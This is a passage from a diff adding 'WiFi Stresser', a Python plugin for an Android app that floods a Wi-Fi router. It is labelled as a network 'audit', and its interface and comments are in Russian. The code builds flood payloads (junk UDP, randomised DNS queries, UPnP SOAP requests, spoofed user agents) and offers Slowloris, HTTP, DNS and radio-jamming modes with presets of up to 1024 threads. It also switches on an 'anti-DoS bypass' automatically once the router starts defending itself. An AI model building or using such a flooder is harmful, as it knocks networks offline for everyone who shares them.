@@ -1,0 +1,1892 @@
+# wifi_stresser.dolphyplugin
+__id__ = "wifi_stresser"
+__name__ = "WiFi Stresser"
+__version__ = "3.0"
+__author__ = "pixel_floppa"
+__description__ = "Аудит Wi-Fi (WPA3 Bypass 4.0, End-to-End ACK, JSON/CSV Export & Expanded Guide)"
+__icon__ = "rounded:wifi_off"
+__library__ = False
+__design_library__ = False
+__dependencies__ = []
+__permissions__ = ["internet", "files"]
+
+import threading
+import socket
+import struct
+import time
+import random
+import json
+import csv
+import os
+
+try:
+    threading.stack_size(128 * 1024)
+except Exception:
+    pass
+
+HTTP_PATHS = [
+    "/", "/login", "/cgi-bin/luci", "/api/v1/status",
+    "/setup.html", "/index.html", "/status", "/service.cgi",
+    "/rootDesc.xml", "/igd.xml", "/device.xml"
+]
+
+COMMON_AUDIT_PORTS = [
+    (80, "HTTP"),
+    (443, "HTTPS"),
+    (53, "DNS"),
+    (8080, "Web-Alt"),
+    (1900, "SSDP/UPnP"),
+    (5000, "UPnP Web"),
+    (5351, "NAT-PMP")
+]
+
+JUNK_PAYLOADS = [os.urandom(size) for size in [128, 256, 512, 768, 1024]]
+
+
+def generate_random_user_agent():
+    android_models = ["SM-S928B", "SM-G998B", "Pixel 8 Pro", "Pixel 9", "23127PN0CG", "Redmi Note 13", "NX769J"]
+    platforms = [
+        ("Windows NT 10.0; Win64; x64", "chrome"),
+        ("Windows NT 10.0; Win64; x64", "firefox"),
+        ("Macintosh; Intel Mac OS X 10_15_7", "chrome"),
+        ("Macintosh; Intel Mac OS X 10_15_7", "safari"),
+        ("X11; Linux x86_64", "chrome"),
+        ("X11; Linux x86_64", "firefox"),
+        (f"Linux; Android {random.randint(11, 15)}; {random.choice(android_models)}", "mobile_chrome"),
+        (f"iPhone; CPU iPhone OS {random.randint(16, 18)}_{random.randint(0, 5)} like Mac OS X", "mobile_safari")
+    ]
+    plat, browser = random.choice(platforms)
+    chrome_ver = f"{random.randint(120, 138)}.0.{random.randint(1000, 6999)}.{random.randint(10, 199)}"
+    firefox_ver = f"{random.randint(120, 136)}.0"
+    safari_ver = f"{random.randint(16, 18)}.{random.randint(0, 5)}"
+
+    if browser == "chrome":
+        return f"Mozilla/5.0 ({plat}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36"
+    elif browser == "firefox":
+        return f"Mozilla/5.0 ({plat}; rv:{firefox_ver}) Gecko/20100101 Firefox/{firefox_ver}"
+    elif browser == "safari":
+        return f"Mozilla/5.0 ({plat}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_ver} Safari/537.36"
+    elif browser == "mobile_chrome":
+        return f"Mozilla/5.0 ({plat}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Mobile Safari/537.36"
+    elif browser == "mobile_safari":
+        return f"Mozilla/5.0 ({plat}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_ver} Mobile/15E148 Safari/604.1"
+    return f"Mozilla/5.0 ({plat}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36"
+
+
+def build_random_dns_query():
+    tx_id = os.urandom(2)
+    flags = b"\x01\x00"
+    qdcount = b"\x00\x01"
+    ancount = b"\x00\x00"
+    nscount = b"\x00\x00"
+    arcount = b"\x00\x00"
+    subdomain = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8)).encode()
+    tld = random.choice([b"com", b"net", b"org", b"xyz", b"biz"])
+    qname = bytes([len(subdomain)]) + subdomain + bytes([len(tld)]) + tld + b"\x00"
+    qtype = random.choice([b"\x00\x01", b"\x00\x10", b"\x00\xff"])
+    qclass = b"\x00\x01"
+    return tx_id + flags + qdcount + ancount + nscount + arcount + qname + qtype + qclass
+
+
+def build_upnp_soap_payload(gateway_ip):
+    soap_body = (
+        '<?xml version="1.0"?>\r\n'
+        '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n'
+        '<s:Body>\r\n'
+        '<u:GetStatusInfo xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">\r\n'
+        '</u:GetStatusInfo>\r\n'
+        '</s:Body>\r\n'
+        '</s:Envelope>\r\n'
+    )
+    req = (
+        f"POST /ctl/IPConn HTTP/1.1\r\n"
+        f"Host: {gateway_ip}:1900\r\n"
+        f"User-Agent: {generate_random_user_agent()}\r\n"
+        f"SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#GetStatusInfo\"\r\n"
+        f"Content-Type: text/xml; charset=\"utf-8\"\r\n"
+        f"Content-Length: {len(soap_body)}\r\n"
+        f"Connection: close\r\n\r\n"
+        f"{soap_body}"
+    )
+    return req.encode()
+
+
+class WiFiStresser(BasePlugin):
+    def on_plugin_load(self):
+        self.add_module(
+            title="WiFi Stresser",
+            description="L4/L7/L2/UPnP/DNS/WPA3 Bypass 4.0 аудит",
+            icon="wifi_off",
+            screen="main",
+            section="PLUGINS"
+        )
+
+        self.api.registerSettings(
+            "WiFi Stresser",
+            json.dumps([
+                {"type": "slider", "key": "udp_threads", "title": "UDP потоки",
+                 "min": 16, "max": 1024, "default": 256, "steps": 1008},
+                {"type": "slider", "key": "tcp_threads", "title": "TCP потоки",
+                 "min": 4, "max": 128, "default": 32, "steps": 124},
+                {"type": "switch", "key": "throttle_ignore",
+                 "title": "Игнорировать троттлинг",
+                 "subtitle": "Не снижать частоту отправки при нагреве",
+                 "default": False}
+            ]),
+            10
+        )
+
+        self._cache_privileges()
+
+        self.running = False
+        self.stop_flag = False
+        self.threads = []
+        self.sockets = []
+        self.sockets_lock = threading.Lock()
+        self.stats_lock = threading.Lock()
+        self.stats = {"http": 0, "connect": 0, "hold": 0, "udp": 0, "upnp": 0, "dns": 0, "l2": 0}
+
+        self.pps = 0
+        self.time_left = 0
+        self.ping_status = "Нажмите «Пинг» для проверки соединения"
+        self._is_pinging = False
+        self._is_scanning_ports = False
+        self._last_l2_time = 0.0
+
+        self.vitality_status = "Ожидание запуска теста"
+        self.generated_report_text = ""
+        self.scan_results = []
+
+        self.logs = []
+        self.logs_lock = threading.Lock()
+
+        self.gateway = self.get_setting("gateway", "192.168.1.1")
+        self.port = int(self.get_setting("port", 80))
+        
+        self.udp_threads = int(self.get_setting("udp_threads", 256))
+        self.tcp_threads = int(self.get_setting("tcp_threads", 32))
+        
+        self.duration = int(self.get_setting("duration", 60))
+        self.method = self.get_setting("method", "UDP")
+        self.active_preset = self.get_setting("active_preset", "Custom")
+        self.throttle_ignore = bool(self.get_setting("throttle_ignore", False))
+        self.bypass_mode = bool(self.get_setting("bypass_mode", False))
+
+        self.mixed_udp = self.get_setting("mixed_udp", True)
+        self.mixed_connect = self.get_setting("mixed_connect", True)
+        self.mixed_http = self.get_setting("mixed_http", True)
+        self.mixed_hold = self.get_setting("mixed_hold", True)
+        self.mixed_slowloris = self.get_setting("mixed_slowloris", True)
+        self.mixed_slowbody = self.get_setting("mixed_slowbody", True)
+        self.mixed_upnp = self.get_setting("mixed_upnp", True)
+        self.mixed_dns = self.get_setting("mixed_dns", True)
+        self.mixed_l2 = self.get_setting("mixed_l2", True)
+
+        self._init_auto_gateway()
+
+    def _cache_privileges(self):
+        root_ok = False
+        try:
+            res = self.root("id")
+            if res:
+                res_str = str(res).strip().lower()
+                if not ("denied" in res_str or "error" in res_str or "not found" in res_str):
+                    root_ok = ("uid=0(" in res_str) or res_str.startswith("uid=0")
+        except Exception:
+            pass
+        self._cached_root = root_ok
+
+        shizuku_ok = False
+        try:
+            res = self.shizuku("id")
+            if res:
+                res_str = str(res).strip().lower()
+                if not ("denied" in res_str or "error" in res_str or "not found" in res_str or "exception" in res_str):
+                    shizuku_ok = ("uid=2000(" in res_str) or res_str.startswith("uid=2000") or ("uid=0(" in res_str) or res_str.startswith("uid=0")
+        except Exception:
+            pass
+        self._cached_shizuku = shizuku_ok
+
+    @property
+    def has_root(self):
+        return self._cached_root
+
+    @property
+    def has_shizuku(self):
+        return self._cached_shizuku
+
+    def _log(self, text, level="INFO"):
+        icons = {"INFO": "ℹ️", "WARN": "⚠️", "ERR": "❌", "OK": "✅", "HEALTH": "🩺", "BYPASS": "⚡", "SCAN": "🔍"}
+        prefix = icons.get(level, "🔹")
+        timestamp = time.strftime("%H:%M:%S")
+        entry = f"[{timestamp}] {prefix} {text}"
+
+        with self.logs_lock:
+            self.logs.append(entry)
+            if len(self.logs) > 40:
+                self.logs.pop(0)
+
+    def _clear_logs(self):
+        with self.logs_lock:
+            self.logs.clear()
+        self.refresh()
+
+    def _record_error(self, method_name, error):
+        err_str = str(error)
+        err_type = type(error).__name__
+
+        if "ECONNREFUSED" in err_str or "Connection refused" in err_str:
+            detail = f"{method_name}: Порт закрыт / сброшен роутером (RST)"
+        elif "ETIMEDOUT" in err_str or "timed out" in err_str:
+            detail = f"{method_name}: Таймаут (шлюз перегружен)"
+        elif "ENETUNREACH" in err_str or "Network is unreachable" in err_str:
+            detail = f"{method_name}: Сеть недоступна (Wi-Fi потерян)"
+        elif "EMFILE" in err_str or "Too many open files" in err_str:
+            detail = f"{method_name}: Лимит дескрипторов ОС! Снизьте TCP-потоки"
+        elif "ENOBUFS" in err_str or "No buffer space" in err_str:
+            detail = f"{method_name}: Буфер сети заполнен"
+        elif "EPIPE" in err_str or "Broken pipe" in err_str:
+            detail = f"{method_name}: Соединение разорвано шлюзом"
+        else:
+            detail = f"{method_name}: {err_type} ({err_str[:35]})"
+
+        self._log(detail, "ERR")
+
+    def _safe_close_socket(self, sock):
+        if not sock:
+            return
+        try:
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
+        except Exception:
+            pass
+        try:
+            sock.close()
+        except Exception:
+            pass
+
+    def _ui_and_timer_loop(self):
+        last_total = 0
+        last_time = time.time()
+        timer_accumulator = 0.0
+
+        while self.running and not self.stop_flag:
+            time.sleep(0.4)
+            now = time.time()
+            dt = now - last_time
+            last_time = now
+
+            with self.stats_lock:
+                current_total = sum(self.stats.values())
+            if dt > 0:
+                self.pps = int((current_total - last_total) / dt)
+                last_total = current_total
+
+            if self.duration > 0:
+                timer_accumulator += dt
+                if timer_accumulator >= 1.0:
+                    dec = int(timer_accumulator)
+                    self.time_left = max(0, self.time_left - dec)
+                    timer_accumulator -= dec
+
+                    if self.time_left <= 0:
+                        threading.Thread(target=self._stop_stress, daemon=True).start()
+                        break
+
+            self.refresh()
+
+    def _vitality_monitor_loop(self):
+        time.sleep(3.0)
+        while self.running and not self.stop_flag:
+            target_host = self.gateway.strip()
+            target_port = self.port
+            target_ok = 0
+            dns_ok = 0
+            latencies = []
+
+            for _ in range(3):
+                if self.stop_flag:
+                    break
+                try:
+                    t0 = time.time()
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(0.8)
+                    s.connect((target_host, target_port))
+                    self._safe_close_socket(s)
+                    latencies.append((time.time() - t0) * 1000)
+                    target_ok += 1
+                except Exception:
+                    pass
+                time.sleep(0.15)
+
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.8)
+                s.connect((target_host, 53))
+                self._safe_close_socket(s)
+                dns_ok += 1
+            except Exception:
+                pass
+
+            if target_ok == 0 and dns_ok > 0:
+                status_str = "🛡️ Защита активна (Anti-DoS / порт фильтруется)"
+                log_lvl = "HEALTH"
+
+                if not self.bypass_mode:
+                    self.bypass_mode = True
+                    self.set_setting("bypass_mode", True)
+                    self._log("⚡ Роутер защищается! Включен авто-обход Bypass 4.0", "BYPASS")
+                    self.toast("⚡ Включен авто-обход Keenetic!")
+            elif target_ok == 0 and dns_ok == 0:
+                status_str = "🔴 В коме / Упал (100% потерь · таймаут)"
+                log_lvl = "ERR"
+            else:
+                avg_ms = round(sum(latencies) / len(latencies), 1) if latencies else 0.0
+                loss = int(((3 - target_ok) / 3) * 100)
+                if loss == 0 and avg_ms < 35:
+                    status_str = f"🟢 Отличная (avg {avg_ms} ms · потерь 0%)"
+                    log_lvl = "OK"
+                elif loss == 0 and avg_ms < 120:
+                    status_str = f"🟡 Проседает (avg {avg_ms} ms · задержка)"
+                    log_lvl = "WARN"
+                else:
+                    status_str = f"🟠 Перегружен (avg {avg_ms} ms · потери {loss}%)"
+                    log_lvl = "WARN"
+
+            self.vitality_status = status_str
+            self._log(f"Живучесть Wi-Fi: {status_str}", log_lvl)
+            self.refresh()
+
+            for _ in range(15):
+                if not self.running or self.stop_flag:
+                    break
+                time.sleep(1.0)
+
+    # ------------------- Диагностика и сканирование -------------------
+
+    def _run_port_scan(self):
+        if self._is_scanning_ports:
+            return
+        self._is_scanning_ports = True
+        self.scan_results = []
+        self._log(f"Сканирование портов шлюза {self.gateway}...", "SCAN")
+        self.toast("🔍 Сканирование портов...")
+        self.refresh()
+        threading.Thread(target=self._async_port_scan_worker, daemon=True).start()
+
+    def _async_port_scan_worker(self):
+        target_host = self.gateway.strip()
+        open_ports = []
+
+        for p, name in COMMON_AUDIT_PORTS:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.6)
+                res = s.connect_ex((target_host, p))
+                self._safe_close_socket(s)
+                if res == 0:
+                    open_ports.append((p, name))
+            except Exception:
+                pass
+
+        self._is_scanning_ports = False
+        self.scan_results = open_ports
+
+        if open_ports:
+            ports_str = ", ".join([f"{p} ({name})" for p, name in open_ports])
+            self._log(f"Открытые порты: {ports_str}", "OK")
+            best_port = open_ports[0][0]
+            self.port = best_port
+            self.set_setting("port", best_port)
+            self.toast(f"✅ Найдено: {len(open_ports)}. Выбран {best_port} ({open_ports[0][1]})")
+        else:
+            self._log("Открытых TCP-портов не найдено (активен строгий фильтр)", "WARN")
+            self.toast("⚠️ Открытых портов не обнаружено")
+        self.refresh()
+
+    def _apply_preset(self, preset_name):
+        self.active_preset = preset_name
+        self.set_setting("active_preset", preset_name)
+
+        if preset_name == "Standart":
+            self.method = "HTTP"
+            self.tcp_threads = 64
+            self.bypass_mode = False
+            self.port = 80
+            self.toast("🎯 Пресет: Стандартный роутер (HTTP)")
+        elif preset_name == "Keenetic":
+            self.method = "Mixed"
+            self.udp_threads = 128
+            self.tcp_threads = 24
+            self.bypass_mode = True
+            self.port = 53
+            self.mixed_udp = True
+            self.mixed_connect = True
+            self.mixed_http = True
+            self.mixed_hold = True
+            self.mixed_slowloris = True
+            self.mixed_slowbody = True
+            self.mixed_upnp = True
+            self.mixed_dns = True
+            self.toast("🛡️ Пресет: Защищенный роутер (Bypass 4.0)")
+        elif preset_name == "Radio":
+            self.method = "L2 (Root)" if (self.has_root or self.has_shizuku) else "UDP"
+            self.udp_threads = 512
+            self.bypass_mode = True
+            self.toast("📡 Пресет: Забивание радиоэфира (512 UDP)")
+        elif preset_name == "MaxStress":
+            self.method = "Mixed"
+            self.udp_threads = 512
+            self.tcp_threads = 64
+            self.bypass_mode = True
+            self.mixed_udp = True
+            self.mixed_connect = True
+            self.mixed_http = True
+            self.mixed_hold = True
+            self.mixed_slowloris = True
+            self.mixed_slowbody = True
+            self.mixed_upnp = True
+            self.mixed_dns = True
+            self.toast("🔥 Пресет: Полный стресс-тест")
+
+        self.set_setting("method", self.method)
+        self.set_setting("udp_threads", self.udp_threads)
+        self.set_setting("tcp_threads", self.tcp_threads)
+        self.set_setting("bypass_mode", self.bypass_mode)
+        self.set_setting("port", self.port)
+        self.refresh()
+
+    def _export_audit_report(self):
+        with self.stats_lock:
+            total_packets = sum(self.stats.values())
+            stats_copy = dict(self.stats)
+
+        dur_text = f"{self.duration} сек" if self.duration > 0 else "Без лимита"
+        thread_info = f"UDP: {self.udp_threads}, TCP: {self.tcp_threads}" if self.method == "Mixed" else (f"{self.tcp_threads} TCP" if self.method in ["CONNECT", "HTTP", "Hold", "Slowloris", "SlowBody"] else f"{self.udp_threads} UDP")
+
+        report_lines = [
+            "📋 === ОТЧЁТ СЕТЕВОГО АУДИТА (WiFi Stresser v3.0) ===",
+            f"👤 Автор: {__author__}",
+            f"🎯 Цель: {self.gateway}:{self.port}",
+            f"⚡ Метод: {self.method} (Пресет: {self.active_preset})",
+            f"🧵 Потоки: {thread_info} | Длительность: {dur_text}",
+            f"🛡️ Режим обхода WAF: {'Включен (Bypass 4.0)' if self.bypass_mode else 'Выключен'}",
+            f"🩺 Итоговая живучесть: {self.vitality_status}",
+            f"📊 Всего отправлено: {total_packets:,} пак".replace(",", " "),
+            f"📈 Пиковая скорость: ~{self.pps} пак/сек",
+            "--- Разделение по векторам ---",
+            f"• UDP (DNS NXDOMAIN): {stats_copy.get('udp', 0)}",
+            f"• UPnP SOAP XML: {stats_copy.get('upnp', 0)}",
+            f"• DNS Flood: {stats_copy.get('dns', 0)}",
+            f"• HTTP Flood: {stats_copy.get('http', 0)}",
+            f"• TCP Connect: {stats_copy.get('connect', 0)}",
+            f"• TCP Hold / Slowloris / SlowBody: {stats_copy.get('hold', 0)}",
+            f"• L2 Wi-Fi Scans: {stats_copy.get('l2', 0)}",
+            "=================================================="
+        ]
+        self.generated_report_text = "\n".join(report_lines)
+
+        try:
+            timestamp_str = time.strftime("%Y%m%d_%H%M%S")
+            export_data = {
+                "version": "3.0",
+                "gateway": self.gateway,
+                "port": self.port,
+                "method": self.method,
+                "total_packets": total_packets,
+                "peak_pps": self.pps,
+                "stats": stats_copy,
+                "vitality": self.vitality_status
+            }
+            
+            json_path = f"/sdcard/Download/wifi_audit_{timestamp_str}.json"
+            with open(json_path, "w", encoding="utf-8") as f:
+                json.dump(export_data, f, ensure_ascii=False, indent=4)
+
+            csv_path = f"/sdcard/Download/wifi_audit_{timestamp_str}.csv"
+            with open(csv_path, "w", newline="", encoding="utf-8") as f:
+                writer = csv.writer(f)
+                writer.writerow(["Metric", "Value"])
+                for k, v in export_data.items():
+                    if isinstance(v, dict):
+                        for sub_k, sub_v in v.items():
+                            writer.writerow([f"{k}_{sub_k}", sub_v])
+                    else:
+                        writer.writerow([k, v])
+            self._log(f"Отчет сохранен в Download (JSON/CSV)", "OK")
+        except Exception as e:
+            self._log(f"Ошибка сохранения файла: {e}", "ERR")
+
+        copied = False
+        try:
+            from com.chaquo.python import Python
+            from android.content import Context, ClipData
+            app_context = Python.getPlatform().getApplication()
+            clipboard = app_context.getSystemService(Context.CLIPBOARD_SERVICE)
+            clip = ClipData.newPlainText("WiFi Stresser Report", self.generated_report_text)
+            clipboard.setPrimaryClip(clip)
+            copied = True
+        except Exception:
+            pass
+
+        if not copied:
+            for attr in ["setClipboard", "copyToClipboard", "setClipboardText", "copy"]:
+                if hasattr(self.api, attr):
+                    try:
+                        getattr(self.api, attr)(self.generated_report_text)
+                        copied = True
+                        break
+                    except Exception:
+                        pass
+
+        self._log("Отчёт аудита сформирован и открыт", "OK")
+        self.toast("📋 Отчёт скопирован и сохранен в файлы!" if copied else "📄 Отчёт открыт")
+        self.navigate("report")
+
+    def _open_rickroll(self):
+        url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+        for method in ["openUrl", "open_url", "openBrowser"]:
+            if hasattr(self.api, method):
+                try:
+                    getattr(self.api, method)(url)
+                    return
+                except Exception:
+                    pass
+        try:
+            from com.chaquo.python import Python
+            from android.content import Intent
+            from android.net import Uri
+            activity = Python.getPlatform().getApplication()
+            intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            activity.startActivity(intent)
+        except Exception:
+            self.toast("⚡ Роутер успешно уничтожен (в параллельной вселенной)")
+
+    def _get_wifi_info(self):
+        ssid = None
+        ip = None
+        is_wifi = False
+
+        try:
+            device_info = self.api.getDevice()
+            if device_info:
+                data = json.loads(device_info) if isinstance(device_info, str) else device_info
+                wifi = data.get("wifi", {}) or data.get("network", {}).get("wifi", {})
+                raw_ssid = wifi.get("ssid") or wifi.get("name") or wifi.get("SSID")
+                raw_ip = wifi.get("ip") or wifi.get("IP") or wifi.get("address")
+
+                if raw_ssid and str(raw_ssid).strip() not in ["<unknown ssid>", "0x", "", "null", "None"]:
+                    ssid = str(raw_ssid).strip()
+                    is_wifi = True
+                if raw_ip and str(raw_ip).strip() not in ["", "null", "None"]:
+                    ip = str(raw_ip).strip()
+        except Exception:
+            pass
+
+        if not ip or ip in ["—", "127.0.0.1"]:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.settimeout(0.4)
+                s.connect(("8.8.8.8", 80))
+                ip = s.getsockname()[0]
+                self._safe_close_socket(s)
+            except Exception:
+                ip = None
+
+        if ip:
+            if ip.startswith("198.18."):
+                ssid = "VPN Fake-IP (не Wi-Fi)"
+                is_wifi = False
+            elif ip.startswith("192.168."):
+                is_wifi = True
+                if not ssid:
+                    ssid = "Wi-Fi (LAN)"
+            elif ip.startswith("100.") or ip.startswith("10.") and not is_wifi:
+                if not ssid:
+                    ssid = "Мобильная сеть / VPN"
+            else:
+                if not ssid:
+                    ssid = "Подключено (Wi-Fi/LAN)"
+                    is_wifi = True
+        else:
+            ssid = "Wi-Fi не подключён"
+
+        return ssid, ip or "—", is_wifi
+
+    def _init_auto_gateway(self):
+        _, ip, is_wifi = self._get_wifi_info()
+        if is_wifi and ip and ip != "—" and "." in ip:
+            octets = ip.split(".")
+            octets[-1] = "1"
+            self.gateway = ".".join(octets)
+            self.set_setting("gateway", self.gateway)
+        else:
+            if not self.gateway or self.gateway.startswith("198.18."):
+                self.gateway = "192.168.1.1"
+
+    def _auto_detect_gateway(self):
+        _, ip, _ = self._get_wifi_info()
+        if ip and ip != "—" and "." in ip:
+            if ip.startswith("198.18."):
+                self.toast("⚠️ Отключите Fake-IP VPN для автоопределения")
+                return
+
+            octets = ip.split(".")
+            if len(octets) == 4:
+                octets[-1] = "1"
+                self.gateway = ".".join(octets)
+                self.set_setting("gateway", self.gateway)
+                self._log(f"Шлюз автоопределён: {self.gateway}", "OK")
+                self.refresh()
+                self.toast(f"🎯 Шлюз: {self.gateway}")
+                return
+
+        self.toast("❌ Не удалось определить IP подсети")
+
+    def _test_gateway_reachability(self):
+        if self._is_pinging:
+            return
+        self._is_pinging = True
+        self.ping_status = "⏳ Проверка связи..."
+        self.refresh()
+        threading.Thread(target=self._async_ping_worker, daemon=True).start()
+
+    def _async_ping_worker(self):
+        target_host = self.gateway.strip()
+        target_port = self.port
+        self._log(f"Проверка связи с {target_host}:{target_port}...", "INFO")
+
+        try:
+            t0 = time.time()
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1.2)
+            s.connect((target_host, target_port))
+            self._safe_close_socket(s)
+            ms = round((time.time() - t0) * 1000, 1)
+            msg = f"Шлюз отвечает · {ms} ms (порт {target_port} открыт)"
+            self.ping_status = f"✅ {msg}"
+            self._log(msg, "OK")
+        except Exception as e:
+            try:
+                t0 = time.time()
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(1.0)
+                s.connect((target_host, 53))
+                self._safe_close_socket(s)
+                ms = round((time.time() - t0) * 1000, 1)
+                self.ping_status = f"⚠️ Шлюз в сети ({ms} ms), но порт {target_port} закрыт/фильтруется"
+                self._log(f"Порт {target_port} закрыт/фильтруется ({type(e).__name__})", "WARN")
+            except Exception as e2:
+                self.ping_status = f"❌ Нет ответа от {target_host}"
+                self._log(f"Хост {target_host} недоступен: {e2}", "ERR")
+        finally:
+            self._is_pinging = False
+            self.refresh()
+
+    def _get_mixed_tcp_methods(self):
+        methods = []
+        if self.mixed_connect:
+            methods.append(self._connect_once)
+        if self.mixed_http:
+            methods.append(self._http_once)
+        if self.mixed_hold:
+            methods.append(self._hold_once)
+        if self.mixed_slowloris:
+            methods.append(self._slowloris_once)
+        if self.mixed_slowbody:
+            methods.append(self._slowbody_once)
+        return methods
+
+    def _get_mixed_udp_methods(self):
+        methods = []
+        if self.mixed_udp:
+            methods.append(self._udp_once)
+        if self.mixed_upnp:
+            methods.append(self._upnp_once)
+        if self.mixed_dns:
+            methods.append(self._dns_once)
+        if self.mixed_l2 and (self.has_root or self.has_shizuku):
+            methods.append(self._l2_once)
+        return methods
+
+    def on_setting_changed(self, payload):
+        key = payload.get("key")
+        value = payload.get("value")
+        if key == "udp_threads":
+            self.udp_threads = int(value)
+            self.set_setting("udp_threads", self.udp_threads)
+        elif key == "tcp_threads":
+            self.tcp_threads = int(value)
+            self.set_setting("tcp_threads", self.tcp_threads)
+        elif key == "throttle_ignore":
+            self.throttle_ignore = bool(value)
+            self.set_setting("throttle_ignore", self.throttle_ignore)
+        self.refresh()
+
+    # ------------------- Главный экран UI -------------------
+
+    def screen_main(self, ui, api, state):
+        ssid, ip, is_wifi = self._get_wifi_info()
+        is_shizuku = self.has_shizuku
+        is_root = self.has_root
+        l2_available = is_root or is_shizuku
+        log_content = "\n".join(self.logs[-7:]) if self.logs else "Событий нет. Выберите пресет или запустите аудит."
+
+        # Сетка режимов
+        mode_cards = [
+            ui.text("Режим стресс-теста", "titleMedium"),
+            ui.row([
+                self._method_chip(ui, "UDP", True),
+                self._method_chip(ui, "CONNECT", True),
+                self._method_chip(ui, "HTTP", True),
+            ], spacing=6, fill_max_width=True),
+            ui.row([
+                self._method_chip(ui, "Hold", True),
+                self._method_chip(ui, "Slowloris", True),
+                self._method_chip(ui, "SlowBody", True),
+            ], spacing=6, fill_max_width=True),
+            ui.row([
+                self._method_chip(ui, "UPnP XML", True),
+                self._method_chip(ui, "DNS Flood", True),
+                self._method_chip(ui, "Mixed", True),
+            ], spacing=6, fill_max_width=True),
+            ui.row([
+                self._method_chip(ui, "L2 (Root)", l2_available),
+            ], spacing=6, fill_max_width=True)
+        ]
+
+        if self.method == "Mixed":
+            mode_cards.append(
+                ui.button(
+                    "⚙️ Настроить связку (Mixed)",
+                    on_click=self._open_mixed_settings,
+                    style="outlined",
+                    fill_max_width=True
+                )
+            )
+
+        time_progress = 0.0
+        if self.running and self.duration > 0:
+            time_progress = max(0.0, min(1.0, (self.duration - self.time_left) / float(self.duration)))
+
+        if self.running:
+            timer_text = "⏳ Работает: ∞ Бесконечно" if self.duration == 0 else f"⏳ Осталось: {self.time_left} сек (из {self.duration}с)"
+        else:
+            timer_text = f"⏱️ Длительность: {'∞ Бесконечно' if self.duration == 0 else str(self.duration) + ' сек'}"
+
+        net_icon = "📶" if is_wifi else "🌐"
+
+        active_socks = len(self.sockets) if self.running else 0
+
+        if self.method == "Mixed":
+            stats_speed_text = f"⚡ {self.pps:,} пак/с · 🪝 {active_socks} сок".replace(",", " ")
+        elif self.method in ["Hold", "Slowloris", "SlowBody"]:
+            stats_speed_text = f"🪝 Удержано сокетов: {active_socks}"
+        else:
+            stats_speed_text = f"⚡ {self.pps:,} пак/с".replace(",", " ")
+
+        slider_components = []
+        is_mixed = (self.method == "Mixed")
+        is_tcp = (self.method in ["CONNECT", "HTTP", "Hold", "Slowloris", "SlowBody"])
+        is_udp = (self.method in ["UDP", "UPnP XML", "DNS Flood", "L2 (Root)"])
+
+        if is_mixed or is_udp:
+            slider_components.append(
+                ui.slider(
+                    value=float(self.udp_threads),
+                    on_change=lambda v: self._set_udp_threads(int(v)),
+                    minimum=16,
+                    maximum=1024,
+                    title=f"UDP потоки: {self.udp_threads}",
+                    steps=1008
+                )
+            )
+
+        if is_mixed or is_tcp:
+            slider_components.append(
+                ui.slider(
+                    value=float(self.tcp_threads),
+                    on_change=lambda v: self._set_tcp_threads(int(v)),
+                    minimum=4,
+                    maximum=128,
+                    title=f"TCP потоки: {self.tcp_threads} (лимит ОС)",
+                    steps=124
+                )
+            )
+
+        children = [
+            # 1. Сеть и статус
+            ui.card([
+                ui.column([
+                    ui.text(f"{net_icon} {ssid}", "titleMedium"),
+                    ui.text(f"IP: {ip}", "bodyMedium"),
+                    ui.row([
+                        ui.text(f"Shizuku: {'✅ Доступен' if is_shizuku else '❌ Не активен'}", "bodySmall"),
+                        ui.text(f"· Root: {'✅ Есть' if is_root else '❌ Нет'}", "bodySmall")
+                    ], spacing=6)
+                ], spacing=4)
+            ]),
+
+            # 2. Пресеты
+            ui.card([
+                ui.text("⚡ Пресеты нагрузки", "titleSmall"),
+                ui.row([
+                    ui.chip("TP-Link", selected=(self.active_preset == "Standart"), on_click=lambda: self._apply_preset("Standart")),
+                    ui.chip("Keenetic WPA3 🛡️", selected=(self.active_preset == "Keenetic"), on_click=lambda: self._apply_preset("Keenetic")),
+                ], spacing=6, fill_max_width=True),
+                ui.row([
+                    ui.chip("Радиоэфир", selected=(self.active_preset == "Radio"), on_click=lambda: self._apply_preset("Radio")),
+                    ui.chip("Max Stress 🔥", selected=(self.active_preset == "MaxStress"), on_click=lambda: self._apply_preset("MaxStress")),
+                ], spacing=6, fill_max_width=True)
+            ]),
+
+            # 3. Диагностика цели
+            ui.card([
+                ui.row([
+                    ui.text("🔍 Диагностика цели", "titleSmall"),
+                    ui.button("📖 Гайд", on_click=lambda: self.navigate("guide"), style="text")
+                ], fill_max_width=True),
+                ui.row([
+                    ui.button("⚡ Проверить пинг", on_click=self._test_gateway_reachability, style="outlined"),
+                    ui.button("🔍 Сканер портов", on_click=self._run_port_scan, style="outlined")
+                ], spacing=8),
+                ui.text(self.ping_status, "bodySmall")
+            ]),
+
+            # 4. Выбор метода
+            ui.card(mode_cards),
+
+            # 5. Параметры цели, времени и потоков
+            ui.card([
+                ui.row([
+                    ui.text("Параметры цели и времени", "titleMedium"),
+                    ui.button("🎯 Авто-IP", on_click=self._auto_detect_gateway, style="text")
+                ], fill_max_width=True),
+                ui.text_field(
+                    value=self.gateway,
+                    on_change=lambda v: self._set_gateway(v),
+                    label="Шлюз (IP роутера)",
+                    single_line=True,
